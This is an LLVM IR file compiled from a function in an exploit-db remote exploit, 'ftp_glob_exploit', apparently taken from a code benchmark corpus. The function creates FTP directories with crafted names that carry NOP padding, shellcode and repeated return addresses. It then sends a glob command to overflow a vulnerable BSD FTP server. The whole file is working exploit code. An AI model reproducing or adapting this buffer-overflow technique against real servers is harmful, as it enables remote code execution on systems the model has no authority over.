; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_20731.c_ftp_glob_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_20731.c_ftp_glob_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [43 x i8] c"[-] Failed to change directory, aborting!\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"[3] Calculated alignment = %d, total = %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"XXXX\00", align 1
@.str.3 = private unnamed_addr constant [47 x i8] c"[-] Failed to generate directories, aborting!\0A\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"[4] Evil directories created.\0A\00", align 1
@.str.5 = private unnamed_addr constant [41 x i8] c"[-] Failed to cwd back to %s, aborting!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @ftp_glob_exploit(i32 %0, i8* %1, i64 %2, i8* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [300 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i64, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i64 %2, i64* %8, align 8
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %17 = load i8*, i8** %7, align 8
  %18 = call i64 @strlen(i8* %17)
  %19 = add i64 %18, 1
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %13, align 4
  %21 = call i8* (...) @random_string()
  store i8* %21, i8** %15, align 8
  %22 = load i32, i32* %6, align 4
  %23 = load i8*, i8** %7, align 8
  %24 = call i32 @ftp_chdir(i32 %22, i8* %23)
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %29, label %26

26:                                               ; preds = %4
  %27 = load i32, i32* @stderr, align 4
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %27, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %166

29:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  br label %30

30:                                               ; preds = %149, %29
  %31 = load i32, i32* %11, align 4
  %32 = icmp slt i32 %31, 4
  br i1 %32, label %33, label %152

33:                                               ; preds = %30
  %34 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %35 = call i32 @memset(i8* %34, i8 signext 0, i32 300)
  %36 = load i32, i32* %11, align 4
  switch i32 %36, label %122 [
    i32 0, label %37
    i32 3, label %61
  ]

37:                                               ; preds = %33
  %38 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %39 = load i8*, i8** %15, align 8
  %40 = load i8*, i8** %15, align 8
  %41 = call i64 @strlen(i8* %40)
  %42 = call i32 @memcpy(i8* %38, i8* %39, i64 %41)
  %43 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %44 = load i8*, i8** %15, align 8
  %45 = call i64 @strlen(i8* %44)
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  %47 = load i8, i8* @NOP, align 1
  %48 = load i8*, i8** %15, align 8
  %49 = call i64 @strlen(i8* %48)
  %50 = sub i64 255, %49
  %51 = trunc i64 %50 to i32
  %52 = call i32 @memset(i8* %46, i8 signext %47, i32 %51)
  %53 = load i8*, i8** %9, align 8
  %54 = call i64 @strlen(i8* %53)
  %55 = sub i64 255, %54
  %56 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 %55
  %57 = load i8*, i8** %9, align 8
  %58 = load i8*, i8** %9, align 8
  %59 = call i64 @strlen(i8* %58)
  %60 = call i32 @memcpy(i8* %56, i8* %57, i64 %59)
  br label %125

61:                                               ; preds = %33
  %62 = load i32, i32* %13, align 4
  %63 = sext i32 %62 to i64
  %64 = urem i64 %63, 8
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %14, align 4
  %66 = load i32, i32* %14, align 4
  %67 = sext i32 %66 to i64
  %68 = sub i64 8, %67
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %14, align 4
  %70 = load i32, i32* %14, align 4
  %71 = load i32, i32* %13, align 4
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0), i32 %70, i32 %71)
  %73 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %74 = call i32 @strcpy(i8* %73, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0))
  %75 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %76 = getelementptr inbounds i8, i8* %75, i64 4
  %77 = load i32, i32* %14, align 4
  %78 = call i32 @memset(i8* %76, i8 signext 88, i32 %77)
  %79 = load i32, i32* %14, align 4
  %80 = add nsw i32 4, %79
  store i32 %80, i32* %12, align 4
  br label %81

81:                                               ; preds = %118, %61
  %82 = load i32, i32* %12, align 4
  %83 = icmp slt i32 %82, 250
  br i1 %83, label %84, label %121

84:                                               ; preds = %81
  %85 = load i64, i64* %8, align 8
  %86 = call i64 @htonl(i64 %85)
  store i64 %86, i64* %16, align 8
  %87 = load i64, i64* %16, align 8
  %88 = and i64 %87, 255
  %89 = trunc i64 %88 to i8
  %90 = load i32, i32* %12, align 4
  %91 = add nsw i32 %90, 0
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 %92
  store i8 %89, i8* %93, align 1
  %94 = load i64, i64* %16, align 8
  %95 = and i64 %94, 65280
  %96 = lshr i64 %95, 8
  %97 = trunc i64 %96 to i8
  %98 = load i32, i32* %12, align 4
  %99 = add nsw i32 %98, 1
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 %100
  store i8 %97, i8* %101, align 1
  %102 = load i64, i64* %16, align 8
  %103 = and i64 %102, 16711680
  %104 = lshr i64 %103, 16
  %105 = trunc i64 %104 to i8
  %106 = load i32, i32* %12, align 4
  %107 = add nsw i32 %106, 2
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 %108
  store i8 %105, i8* %109, align 1
  %110 = load i64, i64* %16, align 8
  %111 = and i64 %110, 4278190080
  %112 = lshr i64 %111, 24
  %113 = trunc i64 %112 to i8
  %114 = load i32, i32* %12, align 4
  %115 = add nsw i32 %114, 3
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 %116
  store i8 %113, i8* %117, align 1
  br label %118

118:                                              ; preds = %84
  %119 = load i32, i32* %12, align 4
  %120 = add nsw i32 %119, 4
  store i32 %120, i32* %12, align 4
  br label %81

121:                                              ; preds = %81
  br label %125

122:                                              ; preds = %33
  %123 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %124 = call i32 @memset(i8* %123, i8 signext 88, i32 255)
  br label %125

125:                                              ; preds = %122, %121, %37
  %126 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %127 = call i64 @strlen(i8* %126)
  %128 = add i64 %127, 1
  %129 = load i32, i32* %13, align 4
  %130 = sext i32 %129 to i64
  %131 = add i64 %130, %128
  %132 = trunc i64 %131 to i32
  store i32 %132, i32* %13, align 4
  %133 = load i32, i32* %6, align 4
  %134 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %135 = call i32 @ftp_mkdir(i32 %133, i8* %134)
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %140, label %137

137:                                              ; preds = %125
  %138 = load i32, i32* @stderr, align 4
  %139 = call i32 (i32, i8*, ...) @fprintf(i32 %138, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %166

140:                                              ; preds = %125
  %141 = load i32, i32* %6, align 4
  %142 = getelementptr inbounds [300 x i8], [300 x i8]* %10, i64 0, i64 0
  %143 = call i32 @ftp_chdir(i32 %141, i8* %142)
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %148, label %145

145:                                              ; preds = %140
  %146 = load i32, i32* @stderr, align 4
  %147 = call i32 (i32, i8*, ...) @fprintf(i32 %146, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  store i32 0, i32* %5, align 4
  br label %166

148:                                              ; preds = %140
  br label %149

149:                                              ; preds = %148
  %150 = load i32, i32* %11, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %11, align 4
  br label %30

152:                                              ; preds = %30
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0))
  %154 = load i32, i32* %6, align 4
  %155 = load i8*, i8** %7, align 8
  %156 = call i32 @ftp_chdir(i32 %154, i8* %155)
  %157 = icmp ne i32 %156, 0
  br i1 %157, label %162, label %158

158:                                              ; preds = %152
  %159 = load i32, i32* @stderr, align 4
  %160 = load i8*, i8** %7, align 8
  %161 = call i32 (i32, i8*, ...) @fprintf(i32 %159, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.5, i64 0, i64 0), i8* %160)
  store i32 0, i32* %5, align 4
  br label %166

162:                                              ; preds = %152
  %163 = load i32, i32* %6, align 4
  %164 = load i8*, i8** %15, align 8
  %165 = call i32 @send_glob(i32 %163, i8* %164)
  store i32 1, i32* %5, align 4
  br label %166

166:                                              ; preds = %162, %158, %145, %137, %26
  %167 = load i32, i32* %5, align 4
  ret i32 %167
}

declare dso_local i64 @strlen(i8*) #1

declare dso_local i8* @random_string(...) #1

declare dso_local i32 @ftp_chdir(i32, i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i64) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i64 @htonl(i64) #1

declare dso_local i32 @ftp_mkdir(i32, i8*) #1

declare dso_local i32 @send_glob(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
